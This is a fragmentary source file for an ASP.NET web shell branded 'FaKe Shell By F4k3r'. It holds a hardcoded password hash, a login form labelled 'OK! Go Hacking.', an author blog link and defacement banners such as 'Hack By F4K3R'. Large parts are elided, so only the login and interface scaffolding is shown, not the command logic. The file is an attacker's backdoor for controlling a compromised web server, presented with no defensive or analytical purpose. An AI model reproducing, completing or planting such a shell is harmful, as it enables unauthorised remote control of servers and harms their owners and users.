...
<script runat="server">
public string Password="144c9defac04969c7bfad8efaa8ea194";//  fake
...
<title>FaKe Shell By F4k3r</title>
<style type="text/css">
...
<span style="font:400px WST_Span;">N</span>
<br></br>
<a href="http://www.meizhi.in"  target="_blank"><font color="#FF154">[+]F4K3R 'Blog</font> </a>
<br>[+]Fucking To This Server.</br>
[+]OK! go go go.
<br></br>
PassWord:
<br></br>
...
<br><br>
<asp:Button ID="ZSnXu" runat="server" Text="OK! Go Hacking." CssClass="Bin_Style_Login" OnClick="xVm"/><p/>
</div>
<div id="ZVS" runat="server">
<div id="Zzj" runat="server">
<table width="100%" border="1%" cellpadding="0" cellspacing="0">
<tr class="head">
<td ><span style="float:right;"> By F4K3R</span><span id="Bin_Span_Sname" runat="server" enableviewstate="true"></span></td>
</tr>
<tr class="alt1">
...
<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:black;">#### Hack By F4K3R ####</div>
</div>
</form>
</body>
</html>
